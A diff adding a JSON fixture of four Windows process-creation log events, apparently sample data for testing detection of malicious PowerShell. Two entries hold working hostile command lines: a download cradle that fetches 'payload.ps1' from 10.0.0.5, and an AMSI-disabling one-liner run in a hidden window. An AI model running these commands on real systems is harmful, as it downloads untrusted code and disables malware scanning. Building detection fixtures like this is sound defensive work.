@@ -1,0 +1,6 @@
+[
+  {"EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -EncodedCommand ZQBjAGgAbwAgACIAaABlAGwAbABvACIA", "User": "CORP\\jsmith", "ParentImage": "C:\\Windows\\explorer.exe"},
+  {"EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"(New-Object Net.WebClient).DownloadString('http://10.0.0.5/payload.ps1')\"", "User": "CORP\\jsmith", "ParentImage": "C:\\Windows\\System32\\cmd.exe"},
+  {"EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -WindowStyle Hidden -Command \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"", "User": "CORP\\jsmith", "ParentImage": "C:\\Windows\\System32\\cmd.exe"},
+  {"EventID": 1, "Image": "C:\\Windows\\System32\\notepad.exe", "CommandLine": "notepad.exe C:\\Users\\jsmith\\notes.txt", "User": "CORP\\jsmith", "ParentImage": "C:\\Windows\\explorer.exe"}
+]
